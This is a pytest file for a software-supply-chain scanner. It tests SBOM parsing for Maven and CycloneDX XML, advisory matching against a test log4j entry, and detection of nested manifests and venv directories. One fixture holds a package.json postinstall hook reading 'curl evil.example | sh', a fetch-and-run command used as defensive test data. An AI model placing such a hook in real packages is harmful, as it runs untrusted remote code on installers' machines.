"""WO4.0.0-015 — SBOM fidelity + monorepo ecosystem detection.

Covers:
1. Maven SBOM components produce a pom.xml with BOTH <groupId> and
   <artifactId> (the pom parsers drop dependencies lacking either) and the
   resulting scan fires L2-MAVEN-ADV-001 against a matching advisory.
2. CycloneDX XML documents in the 1.4 and 1.6 namespaces parse (the parser
   used to pin the 1.5 namespace for its child-element lookups).
3. Nested manifests (npm/pypi in a subdirectory, no root manifest) select
   their rule families — detection used to be root-manifest-only.
4. A plain ``venv/`` directory selects pypi rules (alignment with the rule
   layer, which scans site-packages under both .venv/ and venv/).
"""

from __future__ import annotations

import json
from pathlib import Path

from picosentry.scan.cli_service import ScanOrchestrator
from picosentry.scan.engine import create_default_engine
from picosentry.scan.sbom import _parse_cyclonedx_xml, parse_sbom


def _cdx_maven_json(group: str = "org.apache.logging.log4j", name: str = "log4j-core") -> dict:
    return {
        "$schema": "http://cyclonedx.org/schema/bom-1.5.schema.json",
        "bomFormat": "CycloneDX",
        "specVersion": "1.5",
        "components": [
            {
                "type": "library",
                "group": group,
                "name": name,
                "version": "2.14.0",
                "purl": f"pkg:maven/{group}/{name}@2.14.0",
            }
        ],
    }


def _write_advisory_db(path: Path) -> None:
    osv = {
        "id": "GHSA-test-maven",
        "summary": "Test maven advisory",
        "published": "2024-01-01",
        "affected": [
            {
                "package": {"ecosystem": "Maven", "name": "log4j-core"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "2.0.0"}, {"fixed": "2.15.0"}]}],
            }
        ],
        "database_specific": {"severity": "CRITICAL"},
    }
    path.write_text(json.dumps([osv]))


def _prepare(sbom_path: Path, target: Path) -> tuple[Path, ScanOrchestrator]:
    """Return (scan_dir, orchestrator) — the SBOM tempdir is owned by the
    orchestrator and is deleted when it is garbage collected, so callers must
    keep it alive for the duration of the scan."""
    orch = ScanOrchestrator.__new__(ScanOrchestrator)
    orch._sbom_tmpdir = None
    return orch._prepare_sbom_target(str(sbom_path), target), orch


class TestMavenSbomCoordinates:
    def test_parse_sbom_produces_group_colon_artifact(self, tmp_path: Path) -> None:
        sbom = tmp_path / "sbom.json"
        sbom.write_text(json.dumps(_cdx_maven_json()))
        refs = parse_sbom(sbom)
        assert len(refs) == 1
        assert refs[0].name == "org.apache.logging.log4j:log4j-core"
        assert refs[0].ecosystem == "maven"

    def test_purl_namespace_used_when_group_missing(self, tmp_path: Path) -> None:
        sbom = tmp_path / "sbom.json"
        data = _cdx_maven_json()
        del data["components"][0]["group"]
        sbom.write_text(json.dumps(data))
        refs = parse_sbom(sbom)
        assert refs[0].name == "org.apache.logging.log4j:log4j-core"

    def test_generated_pom_has_group_and_artifact(self, tmp_path: Path) -> None:
        sbom = tmp_path / "sbom.json"
        sbom.write_text(json.dumps(_cdx_maven_json()))
        scan_dir, _orch = _prepare(sbom, tmp_path)
        pom = (scan_dir / "pom.xml").read_text()
        assert "<groupId>org.apache.logging.log4j</groupId>" in pom
        assert "<artifactId>log4j-core</artifactId>" in pom

    def test_maven_sbom_scan_fires_advisory(self, tmp_path: Path) -> None:
        sbom = tmp_path / "sbom.json"
        sbom.write_text(json.dumps(_cdx_maven_json()))
        adv_dir = tmp_path / "advisories"
        adv_dir.mkdir()
        _write_advisory_db(adv_dir / "maven.json")
        scan_dir, _orch = _prepare(sbom, tmp_path)

        engine = create_default_engine(advisory_db_path=str(adv_dir))
        result = engine.scan(scan_dir)
        adv_findings = [f for f in result.findings if f.rule_id == "L2-MAVEN-ADV-001"]
        assert adv_findings, (
            f"maven-component SBOM must produce L2-MAVEN-ADV-001 findings; "
            f"got rules: {sorted({f.rule_id for f in result.findings})}"
        )
        assert adv_findings[0].package.startswith("org.apache.logging.log4j:log4j-core")


class TestCycloneDXXmlVersions:
    def test_ns_1_4(self) -> None:
        xml = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<bom xmlns="http://cyclonedx.org/schema/bom/1.4" version="1">'
            "  <components>"
            '    <component type="library">'
            "      <name>log4j-core</name>"
            "      <version>2.14.0</version>"
            "      <purl>pkg:maven/org.apache.logging.log4j/log4j-core@2.14.0</purl>"
            "    </component>"
            "  </components>"
            "</bom>"
        )
        refs = _parse_cyclonedx_xml(xml.encode())
        assert len(refs) == 1
        assert refs[0].name == "org.apache.logging.log4j:log4j-core"
        assert refs[0].version == "2.14.0"
        assert refs[0].ecosystem == "maven"

    def test_ns_1_6(self) -> None:
        xml = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<bom xmlns="http://cyclonedx.org/schema/bom/1.6" version="1">'
            "  <components>"
            '    <component type="library">'
            "      <name>lodash</name>"
            "      <version>4.17.21</version>"
            "      <purl>pkg:npm/lodash@4.17.21</purl>"
            "    </component>"
            "  </components>"
            "</bom>"
        )
        refs = _parse_cyclonedx_xml(xml.encode())
        assert len(refs) == 1
        assert refs[0].name == "lodash" and refs[0].ecosystem == "npm"


class TestNestedManifestDetection:
    def test_nested_npm_manifest_selects_npm_rules(self, tmp_path: Path) -> None:
        pkg_dir = tmp_path / "packages" / "web"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(
            json.dumps({"name": "web", "version": "1.0.0", "scripts": {"postinstall": "curl evil.example | sh"}})
        )
        engine = create_default_engine()
        result = engine.scan(tmp_path)
        # The post-install rule reads root/node_modules manifests, so the
        # observable for nested detection is rule SELECTION (execution), not a
        # finding from the nested manifest itself.
        executed = {e.rule_id for e in result.rule_executions}
        assert "L2-POST-001" in executed, (
            f"nested package.json must select npm rule family; executed: {sorted(executed)[:12]}"
        )

    def test_nested_requirements_selects_pypi_rules(self, tmp_path: Path) -> None:
        pkg_dir = tmp_path / "services" / "api"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "requirements.txt").write_text("some-package==1.0.0\n")
        engine = create_default_engine()
        result = engine.scan(pkg_dir.parent.parent)
        # pypi rules are selected for the scan; a benign requirement must not
        # invent findings — the observable is rule EXECUTION, not findings.
        executed = {e.rule_id for e in result.rule_executions}
        assert any(r.startswith("L2-PYPI-") for r in executed), (
            f"nested requirements.txt must select pypi rules; executed: {sorted(executed)[:8]}"
        )

    def test_plain_venv_dir_selects_pypi_rules(self, tmp_path: Path) -> None:
        (tmp_path / "venv" / "lib" / "python3.10" / "site-packages").mkdir(parents=True)
        engine = create_default_engine()
        result = engine.scan(tmp_path)
        executed = {e.rule_id for e in result.rule_executions}
        assert any(r.startswith("L2-PYPI-") for r in executed), (
            f"venv/ must select pypi rules; got: {sorted(executed)[:8]}"
        )


class TestWorkspaceDiscoveryBeyondNpm:
    def test_python_project_discovered(self, tmp_path: Path) -> None:
        from picosentry.scan.workspace import discover_projects

        (tmp_path / "libs" / "core").mkdir(parents=True)
        (tmp_path / "libs" / "core" / "pyproject.toml").write_text("[project]\nname='core'\n")
        projects = discover_projects(tmp_path)
        assert (tmp_path / "libs" / "core").resolve() in projects
